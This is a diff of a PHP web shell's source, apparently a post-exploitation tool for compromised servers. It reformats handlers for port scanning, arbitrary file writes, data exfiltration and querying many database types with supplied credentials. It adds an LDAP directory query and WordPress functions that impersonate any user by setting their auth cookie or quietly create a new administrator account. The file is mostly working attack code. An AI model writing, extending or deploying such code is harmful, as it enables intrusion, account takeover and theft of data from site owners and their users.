                     addDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                 }
@@ -1178,11 +1193,10 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
  *
  * @return void
  */
-function handlePortScan()
-{
-    $host = $_POST['__PARAM_1__'];
+function handlePortScan() {
+    $host      = $_POST['__PARAM_1__'];
     $startPort = intval($_POST['__PARAM_2__']);
-    $endPort = intval($_POST['__PARAM_3__']);
+    $endPort   = intval($_POST['__PARAM_3__']);
 
     out("Scanning ports $startPort to $endPort on $host...");
 
@@ -1196,7 +1210,8 @@ function handlePortScan()
             // The port is open
             fclose($socket);
             out("Port $port: OPEN");
-        } else {
+        }
+        else {
             // The port is closed or unreachable
             out("Port $port: CLOSED / UNREACHABLE (err: $errstr)");
         }
@@ -1209,11 +1224,10 @@ function handlePortScan()
  *
  * @return void
  */
-function handleWriteFile()
-{
-    $filename = $_POST['__PARAM_1__'];
+function handleWriteFile() {
+    $filename               = $_POST['__PARAM_1__'];
     $should_decode_from_b64 = isCheckboxActive("__PARAM_3__");
-    $content = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
+    $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
 
     out(
         array(
@@ -1231,8 +1245,7 @@ function handleWriteFile()
  *
  * @return void
  */
-function handleLogin()
-{
+function handleLogin() {
     global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
     $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
     $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);
@@ -1248,8 +1261,7 @@ function handleLogin()
  *
  * @return string
  */
-function makeExfiltratePage()
-{
+function makeExfiltratePage() {
     global $EXFILTRATE, $ENABLED_FEATURES;
     return makePage(
         array(
@@ -1285,8 +1297,7 @@ function makeExfiltratePage()
  *
  * @return string
  */
-function listEnabledExtensions()
-{
+function listEnabledExtensions() {
     $extensions = get_loaded_extensions();
     ob_start();
     openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
@@ -1305,18 +1316,19 @@ function listEnabledExtensions()
  *
  * @return void
  */
-function runPDOQuery($pdo, $query)
-{
+function runPDOQuery($pdo, $query) {
     $stmt = $pdo->query($query);
     if ($stmt) {
         $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
         if ($result) {
             echo "[Driver: PDO] Query executed successfully.\n";
             printAsciiTable($result);
-        } else {
+        }
+        else {
             echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
         }
-    } else {
+    }
+    else {
         echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
     }
 }
@@ -1324,19 +1336,18 @@ function runPDOQuery($pdo, $query)
 /**
  * Print an ASCII table from the given data
  *
- * @param $data
+ * @param $data array[] Data to print
  *
  * @return void
  */
-function printAsciiTable($data)
-{
+function printAsciiTable($data) {
     // Get column headers
     $headers = array_keys($data[0]);
 
     // Calculate column widths
     $columnWidths = array();
     foreach ($headers as $header) {
-        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+        $columnWidths[$header] = max(array_map('strlen', _array_column($data, $header))) + 2;
     }
 
     // Print top row
@@ -1387,19 +1398,21 @@ function printAsciiTable($data)
  * @param $username string Username to connect with
  * @param $password string Password to connect with
  * @param $host string Host to connect to
- * @param $port int Port to connect to
- * @param $service_name string Service name to use for connection
- * @param $sid string SID to use for connection
- * @param $database string Database to connect to
- * @param $charset string Charset to use for connection
- * @param $options string Options to use for connection
- * @param $role string Role to use for connection
- * @param $dialect string Dialect to use for connection
- * @param $odbc_driver string ODBC driver to use for connection
- * @param $server string Informix server name
+ * @param $port int|null Port to connect to
+ * @param $service_name string|null Service name to use for connection
+ * @param $sid string|null SID to use for connection
+ * @param $database string|null Database to connect to
+ * @param $charset string|null Charset to use for connection
+ * @param $options string|null Options to use for connection
+ * @param $role string|null Role to use for connection
+ * @param $dialect string|null Dialect to use for connection
+ * @param $odbc_driver string|null ODBC driver to use for connection
+ * @param $server string|null Informix server name
  * @param $protocol string Protocol to use for connection
- * @param $enableScrollableCursors string Whether to enable scrollable cursors
+ * @param $enableScrollableCursors string|null Whether to enable scrollable cursors
  * @param $raw_connection_string string Raw connection string to use for connection
+ * @param $query string|null Query to run
+ * @param $collection string|null Collection to use for connection
  *
  * @return void
  */
@@ -1423,8 +1436,7 @@ function connectAndQueryDatabase(
     $raw_connection_string = "",
     $query = null,
     $collection = null
-)
-{
+) {
     if ($db_type === 'mysql') {
         $port = $port ?: 3306;
 
@@ -1434,7 +1446,8 @@ function connectAndQueryDatabase(
 
             if (!$connection) {
                 echo "[Driver: mysql] Connection failed: " . mysql_error();
-            } else {
+            }
+            else {
                 echo "[Driver: mysql] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1446,12 +1459,14 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: mysql] Query failed: " . mysql_error();
                     }
                 }
             }
-        } // Check if the MySQLi extension is loaded
+        }
+        // Check if the MySQLi extension is loaded
         elseif (extension_loaded("mysqli")) {
             mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
             try {
@@ -1459,7 +1474,8 @@ function connectAndQueryDatabase(
 
                 if (!$connection) {
                     echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
-                } else {
+                }
+                else {
                     echo "[Driver: mysqli] Connected successfully using $username:$password.\n";
 
                     if (!empty($query)) {
@@ -1471,20 +1487,23 @@ function connectAndQueryDatabase(
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
                         }
                     }
                 }
-            } catch (mysqli_sql_exception $e) {
+            }
+            catch (mysqli_sql_exception $e) {
                 echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
             }
-        } // Check if the PDO MySQL extension is loaded
+        }
+        // Check if the PDO MySQL extension is loaded
         elseif (extension_loaded("pdo_mysql")) {
             try {
                 $dsn = "mysql:host=$host;port=$port" .
-                    (!empty($database) ? ";dbname=$database" : "") .
-                    (!empty($charset) ? ";charset=$charset" : "");
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
                 echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";
@@ -1492,24 +1511,28 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
             }
-        } // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
+        }
+        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
         elseif (extension_loaded("pdo")) {
             echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
-        } else {
+        }
+        else {
             echo "[Driver: none] MySQL extension is not loaded.\n";
         }
-    } elseif ($db_type === 'cubrid') {
+    }
+    elseif ($db_type === 'cubrid') {
         $port = $port ?: 30000;
 
         // Check if the CUBRID PDO extension is loaded
         if (extension_loaded("pdo_cubrid")) {
             try {
                 $dsn = "cubrid:host=$host;port=$port" .
-                    (!empty($database) ? ";dbname=$database" : "") .
-                    (!empty($charset) ? ";charset=$charset" : "");
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
                 echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";
@@ -1517,16 +1540,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
             }
-        } // Check if the CUBRID extension is loaded
+        }
+        // Check if the CUBRID extension is loaded
         elseif (extension_loaded("cubrid")) {
             $connection = cubrid_connect($host, $port, $database, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
-            } else {
+            }
+            else {
                 echo "[Driver: cubrid] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1538,15 +1564,18 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] CUBRID extension is not loaded.\n";
         }
-    } elseif ($db_type === 'pgsql') {
+    }
+    elseif ($db_type === 'pgsql') {
         $port = $port ?: 5432;
 
         // Check if the PostgreSQL PDO extension is loaded
@@ -1560,16 +1589,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
             }
-        } // Check if the PostgreSQL extension is loaded
+        }
+        // Check if the PostgreSQL extension is loaded
         elseif (extension_loaded("pgsql")) {
             $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");
 
             if (!$connection) {
                 echo "[Driver: pgsql] Connection failed: " . pg_last_error();
-            } else {
+            }
+            else {
                 echo "[Driver: pgsql] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1581,15 +1613,18 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] PostgreSQL extension is not loaded.\n";
         }
-    } elseif ($db_type === 'sqlite') {
+    }
+    elseif ($db_type === 'sqlite') {
         // Check if the SQLite PDO extension is loaded
         if (extension_loaded("pdo_sqlite")) {
             try {
@@ -1601,16 +1636,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
             }
-        } // Check if the SQLite extension is loaded
+        }
+        // Check if the SQLite extension is loaded
         elseif (extension_loaded("sqlite3")) {
             $connection = sqlite_open($host, 0666, $error);
 
             if (!$connection) {
                 echo "[Driver: sqlite3] Connection failed: $error";
-            } else {
+            }
+            else {
                 echo "[Driver: sqlite3] Connected successfully using $host.\n";
 
                 if (!empty($query)) {
@@ -1622,15 +1660,18 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] SQLite extension is not loaded.\n";
         }
-    } elseif ($db_type === 'sqlsrv') {
+    }
+    elseif ($db_type === 'sqlsrv') {
         $port = $port ?: 1433;
 
         // Check if the SQL Server PDO extension is loaded
@@ -1644,10 +1685,12 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
             }
-        } // Check if the SQL Server extension is loaded
+        }
+        // Check if the SQL Server extension is loaded
         elseif (extension_loaded("sqlsrv")) {
             echo "Connecting to $host with default instance specification ...\n";
             $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));
@@ -1663,10 +1706,12 @@ function connectAndQueryDatabase(
 
                 if (!$connection) {
                     echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
-                } else {
+                }
+                else {
                     echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).\n";
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).\n";
             }
 
@@ -1679,14 +1724,17 @@ function connectAndQueryDatabase(
                         $rows[] = $row;
                     }
                     printAsciiTable($rows);
-                } else {
+                }
+                else {
                     echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] SQL Server extension is not loaded.\n";
         }
-    } elseif ($db_type === 'oci') {
+    }
+    elseif ($db_type === 'oci') {
         $port = $port ?: 1521;
 
         // Check if the Oracle PDO extension is loaded
@@ -1694,7 +1742,8 @@ function connectAndQueryDatabase(
             try {
                 if (!empty($sid)) {
                     $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
-                } else {
+                }
+                else {
                     $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
                 }
                 $dsn = "oci:dbname=$tns";
@@ -1705,16 +1754,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
             }
-        } // Check if the Oracle extension is loaded
+        }
+        // Check if the Oracle extension is loaded
         elseif (extension_loaded("oci8")) {
             $connection = oci_connect($username, $password, "$host:$port/$service_name");
 
             if (!$connection) {
                 echo "[Driver: oci8] Connection failed: " . oci_error();
-            } else {
+            }
+            else {
                 echo "[Driver: oci8] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1727,20 +1779,24 @@ function connectAndQueryDatabase(
                                 $rows[] = $row;
                             }
                             printAsciiTable($rows);
-                        } else {
+                        }
+                        else {
                             echo "[Driver: oci8] Query failed: " . oci_error($statement);
                         }
-                    } else {
+                    }
+                    else {
                         echo "[Driver: oci8] Query failed: " . oci_error($connection);
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] Oracle extension is not loaded.\n";
         }
-    } elseif ($db_type === 'mongodb') {
+    }
+    elseif ($db_type === 'mongodb') {
         $port = $port ?: 27017;
-        $dsn = "mongodb://$username:$password@$host:$port/$database";
+        $dsn  = "mongodb://$username:$password@$host:$port/$database";
 
         // Check if the MongoDB extension is loaded
         if (extension_loaded("mongodb")) {
@@ -1749,7 +1805,7 @@ function connectAndQueryDatabase(
                 echo "[Driver: mongodb] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    $query = new MongoDB\Driver\Query(array());
+                    $query  = new MongoDB\Driver\Query(array());
                     $cursor = $connection->executeQuery("$database.$collection", $query);
 
                     $rows = array();
@@ -1758,10 +1814,12 @@ function connectAndQueryDatabase(
                     }
                     printAsciiTable($rows);
                 }
-            } catch (MongoDB\Driver\Exception\Exception $e) {
+            }
+            catch (MongoDB\Driver\Exception\Exception $e) {
                 echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
             }
-        } // Check if the Mongo extension is loaded
+        }
+        // Check if the Mongo extension is loaded
         elseif (extension_loaded("mongo")) {
             try {
                 $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
@@ -1769,7 +1827,7 @@ function connectAndQueryDatabase(
 
                 if (!empty($query)) {
                     $collection = $connection->selectCollection($database, $collection);
-                    $cursor = $collection->find();
+                    $cursor     = $collection->find();
 
                     $rows = array();
                     foreach ($cursor as $row) {
@@ -1777,17 +1835,21 @@ function connectAndQueryDatabase(
                     }
                     printAsciiTable($rows);
                 }
-            } catch (MongoConnectionException $e) {
-                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
-            } catch (Exception $e) {
+            }
+            catch (MongoConnectionException $e) {
                 echo "[Driver: mongo] Connection failed: " . $e->getMessage();
             }
-        } else {
+            catch (Exception $e) {
+                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+            }
+        }
+        else {
             echo "[Driver: none] MongoDB extension is not loaded.\n";
         }
-    } elseif ($db_type === 'ibm') {
+    }
+    elseif ($db_type === 'ibm') {
         $port = $port ?: 50000;
-        $dsn = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
+        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
 
         // Check if the IBM PDO extension is loaded
         if (extension_loaded("pdo_ibm")) {
@@ -1798,16 +1860,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
             }
-        } // Check if the IBM extension is loaded
+        }
+        // Check if the IBM extension is loaded
         elseif (extension_loaded("ibm")) {
             $connection = db2_connect($dsn, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: ibm] Connection failed: " . db2_conn_error();
-            } else {
+            }
+            else {
                 echo "[Driver: ibm] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1819,20 +1884,23 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: ibm] Query failed: " . db2_conn_error();
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] IBM extension is not loaded.\n";
         }
-    } elseif ($db_type === 'firebird') {
+    }
+    elseif ($db_type === 'firebird') {
         $port = $port ?: 3050;
-        $dsn = "firebird:dbname=$host/$port:$database" .
-            (!empty($charset) ? ";charset=$charset" : "") .
-            (!empty($role) ? ";role=$role" : "") .
-            (!empty($dialect) ? ";dialect=$dialect" : "");
+        $dsn  = "firebird:dbname=$host/$port:$database" .
+                (!empty($charset) ? ";charset=$charset" : "") .
+                (!empty($role) ? ";role=$role" : "") .
+                (!empty($dialect) ? ";dialect=$dialect" : "");
 
         // Check if the Firebird PDO extension is loaded
         if (extension_loaded("pdo_firebird")) {
@@ -1843,10 +1911,12 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
             }
-        } // Check if the Firebird extension is loaded
+        }
+        // Check if the Firebird extension is loaded
         elseif (extension_loaded("interbase")) {
             echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
             $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);
@@ -1865,13 +1935,16 @@ function connectAndQueryDatabase(
 
                     if (!$connection) {
                         echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
-                    } else {
+                    }
+                    else {
                         echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).\n";
                     }
-                } else {
+                }
+                else {
                     echo "[Driver: interbase] Connected successfully using $username:$password (host:database).\n";
                 }
-            } else {
+            }
+            else {
                 echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).\n";
             }
 
@@ -1884,14 +1957,17 @@ function connectAndQueryDatabase(
                         $rows[] = $row;
                     }
                     printAsciiTable($rows);
-                } else {
+                }
+                else {
                     echo "[Driver: interbase] Query failed: " . ibase_errmsg();
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] Firebird extension is not loaded.\n";
         }
-    } elseif ($db_type === 'odbc') {
+    }
+    elseif ($db_type === 'odbc') {
         $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";
 
         // Check if the ODBC PDO extension is loaded
@@ -1903,16 +1979,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
             }
-        } // Check if the ODBC extension is loaded
+        }
+        // Check if the ODBC extension is loaded
         elseif (extension_loaded("odbc")) {
             $connection = odbc_connect($dsn, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
-            } else {
+            }
+            else {
                 echo "[Driver: odbc] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1924,17 +2003,20 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: odbc] Query failed: " . odbc_errormsg();
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] ODBC extension is not loaded.\n";
         }
-    } elseif ($db_type === 'informix') {
+    }
+    elseif ($db_type === 'informix') {
         $port = $port ?: 9800;
-        $dsn = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
+        $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
 
         // Check if the Informix PDO extension is loaded
         if (extension_loaded("pdo_informix")) {
@@ -1945,15 +2027,18 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] Informix extension is not loaded.\n";
         }
-    } elseif ($db_type === 'sybase') {
+    }
+    elseif ($db_type === 'sybase') {
         $port = $port ?: 5000;
-        $dsn = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
+        $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
 
         // Check if the Sybase PDO extension is loaded
         if (extension_loaded("pdo_dblib")) {
@@ -1964,16 +2049,19 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
             }
-        } // Check if the Sybase extension is loaded
+        }
+        // Check if the Sybase extension is loaded
         elseif (extension_loaded("sybase")) {
             $connection = sybase_connect($host, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
-            } else {
+            }
+            else {
                 echo "[Driver: sybase] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -1985,18 +2073,21 @@ function connectAndQueryDatabase(
                             $rows[] = $row;
                         }
                         printAsciiTable($rows);
-                    } else {
+                    }
+                    else {
                         echo "[Driver: sybase] Query failed: " . sybase_get_last_message();
                     }
                 }
             }
-        } // Check if the FreeTDS extension is loaded
+        }
+        // Check if the FreeTDS extension is loaded
         elseif (extension_loaded("mssql")) {
             $connection = mssql_connect($host, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
-            } else {
+            }
+            else {
                 echo "[Driver: mssql] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
@@ -2006,15 +2097,18 @@ function connectAndQueryDatabase(
                         while ($row = mssql_fetch_assoc($result)) {
                             echo json_encode($row);
                         }
-                    } else {
+                    }
+                    else {
                         echo "Query failed: " . mssql_get_last_message();
                     }
                 }
             }
-        } else {
+        }
+        else {
             echo "[Driver: none] Sybase extension is not loaded.\n";
         }
-    } elseif ($db_type === 'raw') {
+    }
+    elseif ($db_type === 'raw') {
         $dsn = $raw_connection_string;
 
         // Check if the PDO extension is loaded
@@ -2026,14 +2120,196 @@ function connectAndQueryDatabase(
                 if (!empty($query)) {
                     runPDOQuery($pdo, $query);
                 }
-            } catch (PDOException $e) {
+            }
+            catch (PDOException $e) {
                 echo "[Driver: PDO] Connection failed: " . $e->getMessage();
             }
-        } else {
+        }
+        else {
             echo "[Driver: PDO] PDO extension is not loaded.\n";
         }
-    } else {
+    }
+    else {
         echo "[Driver: none] Unsupported database type: $db_type";
+    }
+}
+
+/**
+ * Handle the query database operation
+ *
+ * @return void
+ */
+function handleQueryDatabase() {
+    connectAndQueryDatabase(
+        $_POST["__PARAM_1__"],
+        $_POST["__PARAM_4__"],
+        $_POST["__PARAM_5__"],
+        $_POST["__PARAM_2__"],
+        intval($_POST["__PARAM_3__"]),
+        $_POST["__PARAM_8__"],
+        $_POST["__PARAM_9__"],
+        $_POST["__PARAM_6__"],
+        $_POST["__PARAM_7__"],
+        $_POST["__PARAM_10__"],
+        $_POST["__PARAM_11__"],
+        $_POST["__PARAM_12__"],
+        $_POST["__PARAM_15__"],
+        $_POST["__PARAM_17__"],
+        $_POST["__PARAM_13__"],
+        $_POST["__PARAM_14__"],
+        $_POST["__PARAM_16__"],
+        $_POST["__PARAM_18__"],
+        $_POST["__PARAM_19__"]
+    );
+}
+
+/**
+ * @param $server string LDAP server
+ * @param $port int|null LDAP port
+ * @param $username string|null LDAP username
+ * @param $password string|null LDAP password
+ * @param $domain string LDAP domain
+ * @param $query string LDAP query
+ *
+ * @return void
+ */
+function runLDAPQuery($server, $port, $username, $password, $domain, $query) {
+    $port = $port ?: 389;
+
+    // Connect to LDAP server
+    $ldap_conn = ldap_connect("ldap://$server", $port);
+
+    if (!$ldap_conn) {
+        echo "Connection failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    $base_dn = "DC=" . implode(",DC=", explode(".", $domain));
+    echo "Connected successfully to LDAP server $server:$port.\n";
+    echo "Base DN: $base_dn\n";
+
+    // Set LDAP options
+    ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+    ldap_set_option($ldap_conn, LDAP_OPT_REFERRALS, 1);
+    ldap_set_option($ldap_conn, LDAP_DEREF_ALWAYS, 1);
+
+    // Bind to LDAP server
+    if (!empty($username) && !empty($password)) {
+        $username = "CN=$username,$base_dn";
+        echo "Binding with username: $username\n";
+
+        // Bind with username and password (authenticating)
+        $ldap_bind = ldap_bind($ldap_conn, $username, $password);
+    }
+    else {
+        echo "Binding anonymously\n";
+        $ldap_bind = ldap_bind($ldap_conn);
+    }
+
+    if (!$ldap_bind) {
+        echo "Bind failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Perform LDAP search
+    $ldap_search = ldap_search($ldap_conn, $base_dn, trim($query), array("*"), 0, 0);
+
+    if (!$ldap_search) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    // Get search result entries
+    $ldap_entries = ldap_get_entries($ldap_conn, $ldap_search);
+
+    if (!$ldap_entries) {
+        echo "Search failed: " . ldap_error($ldap_conn);
+        return;
+    }
+
+    echo "Query executed successfully (Query: $query).\n";
+    echo json_encode($ldap_entries);
+
+    // Close LDAP connection
+    ldap_unbind($ldap_conn);
+}
+
+/**
+ * Get the list of WordPress users
+ *
+ * @return array List of WordPress users
+ */
+function getWPUsers() {
+    return array_map(
+        function ($data) {
+            global $IMPERSONATE_WP_USER;
+            return array_merge(
+                (array) $data->data,
+                array(
+                    "roles"   => $data->roles,
+                    "actions" => makeForm(
+                        $IMPERSONATE_WP_USER,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeInput(
+                                "hidden",
+                                "__PARAM_1__",
+                                "username",
+                                "",
+                                "Username of the user to impersonate.",
+                                true,
+                                null,
+                                $data->data->user_login
+                            ),
+                        ),
+                        "post",
+                        "Impersonate",
+                        "flex flex-col max-w-xl mb-0"
+                    ),
+                )
+            );
+        },
+        get_users()
+    );
+}
+
+/**
+ * Handle the impersonate WordPress user operation and user creation operation
+ *
+ * @return void
+ */
+function handleImpersonateWPUser() {
+    // Run the impersonate operation
+    if (isset($_POST["__PARAM_1__"]) && !empty($_POST["__PARAM_1__"])) {
+        $user = get_user_by("login", $_POST["__PARAM_1__"]);
+        if ($user) {
+            wp_set_current_user($user->ID, $user->user_login);
+            wp_set_auth_cookie($user->ID);
+            wp_redirect(site_url());
+            exit;
+        }
+    }
+    // Run the user creation operation
+    elseif (isset($_POST["__PARAM_2__"]) &&
+            !empty($_POST["__PARAM_2__"]) &&
+            isset($_POST["__PARAM_3__"]) &&
+            !empty($_POST["__PARAM_3__"])) {
+        $user_id = wp_insert_user(
+            array(
+                "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
+                "user_pass"  => $_POST["__PARAM_3__"],
+                "role"       => "administrator",
+            )
+        );
+        if (!is_wp_error($user_id)) {
+            $user = get_user_by("id", $user_id);
+            if ($user) {
+                wp_set_current_user($user->ID, $user->user_login);
+                wp_set_auth_cookie($user->ID);
+                wp_redirect(site_url());
+                exit;
+            }
+        }
     }
 }
 
@@ -2051,6 +2327,7 @@ $isolated_ops = array(
     $FILE_EXTRACTION,
     $EXFILTRATE,
     $LOGIN,
+    $IMPERSONATE_WP_USER,
 );
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
@@ -2092,11 +2369,11 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "y",
                                 $page === $FILE_EXTRACTION_PREVIEW
                                     ? "window.location.href = '?page=" .
-                                    $FILE_EXTRACTION .
-                                    "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                      $FILE_EXTRACTION .
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                     : "window.location.href = '?page=" .
-                                    $FILE_EXTRACTION_PREVIEW .
-                                    "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
